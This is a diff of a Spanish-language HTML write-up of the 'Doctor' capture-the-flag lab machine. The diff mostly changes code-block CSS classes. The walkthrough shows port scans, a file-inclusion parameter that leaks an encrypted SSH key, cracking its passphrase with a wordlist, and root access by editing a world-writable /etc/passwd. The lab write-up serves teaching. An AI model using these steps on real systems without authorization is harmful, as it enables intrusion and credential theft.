@@ -38,7 +38,7 @@
             <img class="img_nyx" src="../../assets/img/nyx_doctor/logo.png" alt="logo">
             <h3>Escaneo de puertos</h3>
             <pre class="pre__nyx">
-<code class="code language-js">❯ nmap -p- -T5 -v -n 192.168.1.15
+<code class="code language-txt">❯ nmap -p- -T5 -v -n 192.168.1.15
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -46,7 +46,7 @@ PORT   STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre__nyx">
-<code class="language-js">❯ nmap -sVC -v -p 22,80 192.168.1.15
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.15
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
@@ -63,7 +63,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre>
             <h3>HTTP</h3>                
-            <p>Después de mirar el menu de navegación entro en<code class="code_negrita">&nbsp;Doctors</code>.</p>
+            <p>Después de mirar el menu de navegación entro en<code class="code_negrita">&nbsp;Doctors&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/nyx_doctor/docmed.png" alt="docmed">
             <p>En<code class="code_negrita">&nbsp;Doctors&nbsp;</code>me llama la atencion el parámetro<code class="code_negrita">&nbsp;include&nbsp;</code>porque muestra el contenido de <code class="code_negrita">&nbsp;Doctors.html</code>.</p>
             <img class="img_b" src="../../assets/img/nyx_doctor/doctors.png" alt="doctors">
@@ -73,18 +73,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
             <img class="img_b" src="../../assets/img/nyx_doctor/id_rsa.png" alt="id_rsa">
             <p>En la imagen anterior se puede observar que la llave rsa está encriptada.</p>
 <pre class="pre__nyx">
-<code class="language-txt">Proc-Type: 4,ENCRYPTED
+<code class="code language-txt">Proc-Type: 4,ENCRYPTED
 </code></pre>
             <p>Si intento conectarme por<code class="code_negrita">&nbsp;SSH&nbsp;</code>me pide un<code class="code_negrita">&nbsp;passphrase&nbsp;</code>que no tengo.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯ ssh admin@192.168.1.15 -i id_rsa
+<code class="code language-txt">❯ ssh admin@192.168.1.15 -i id_rsa
 Enter passphrase for key 'id_rsa':
 </code></pre>
 
             
             <p>Para obtener el passphrase he clonado<code class="code_negrita">&nbsp;RSAcrack&nbsp;</code>.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯  git clone https://github.com/d4t4s3c/RSAcrack.git
+<code class="code language-txt">❯  git clone https://github.com/d4t4s3c/RSAcrack.git
 ❯ ./RSAcrack.sh -w /usr/share/wordlists/rockyou.txt -k id_rsa
 
 ╭━━━┳━━━┳━━━╮          ╭╮  
@@ -100,8 +100,8 @@ Enter passphrase for key 'id_rsa':
     1242/14344392/0%/u*****n                                  
 [+] Password: u*****n Line: 1242
 </code></pre>
-            <p>Me conecto al sistema usando el<code class="code_negrita">&nbsp;passphrase</code>.</p>
-<pre class="pre__nyx"><code class="language-js">❯ ssh admin@192.168.1.15 -i id_rsa
+            <p>Me conecto al sistema usando el<code class="code_negrita">&nbsp;passphrase&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ ssh admin@192.168.1.15 -i id_rsa
 Enter passphrase for key 'id_rsa': 
 Linux doctor 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
 admin@doctor:~$ id
@@ -109,30 +109,30 @@ uid=1000(admin) gid=1000(admin) grupos=1000(admin),24(cdrom),25(floppy),29(audio
 </code></pre>
             <h3>Privesc</h3>
             <p>Enumerando el directorio<code class="code_negrita">&nbsp;/etc&nbsp;</code>encuentro el archivo<code class="code_negrita">&nbsp;passwd&nbsp;</code>y este tiene permisos de lectura y escritura.</p>
-<pre class="pre__nyx"><code class="language-js">admin@doctor:~$ find /etc -writable 2>/dev/null
+<pre class="pre__nyx"><code class="code language-txt">admin@doctor:~$ find /etc -writable 2>/dev/null
 /etc/passwd
 admin@doctor:~$ ls -la /etc/passwd
 -rw----rw- 1 root root 1407 abr 22 02:00 /etc/passwd  
 </code></pre>
 
             <p>Con openssl creo una contraseña.</p>
-<pre class="pre__nyx"><code class="language-js">admin@doctor:/tmp$ openssl passwd
+<pre class="pre__nyx"><code class="code language-txt">admin@doctor:/tmp$ openssl passwd
 Password: 
 Verifying - Password: 
 v1lqXvNcrNYhU
 </code></pre>
             <p>Edito el archivo<code class="code_negrita">&nbsp;/etc/passwd&nbsp;</code>y cambio la<code class="code_negrita">&nbsp;x&nbsp;</code>de root por la contraseña generada anteriormente.</p>
-<pre class="pre__nyx"><code class="language-js">root:v1lqXvNcrNYhU:0:0:root:/root:/bin/bash
+<pre class="pre__nyx"><code class="code language-txt">root:v1lqXvNcrNYhU:0:0:root:/root:/bin/bash
 </code></pre>
 
             <p>Obtengo el root.</p>
-<pre class="pre__nyx"><code class="language-js">admin@doctor:~$ su root
+<pre class="pre__nyx"><code class="code language-txt">admin@doctor:~$ su root
 Contraseña: 
 root@doctor:/home/admin# id
 uid=0(root) gid=0(root) grupos=0(root)
 </code></pre>
 
-            <p>Y con esto ya tenemos resuelta la máquina Doctor del sr Mowree, Saludos!</p>
+            <p>Y con esto ya tenemos resuelta la máquina Doctor del sr Mowree</p>
 
     </main>
         <footer class="footer">
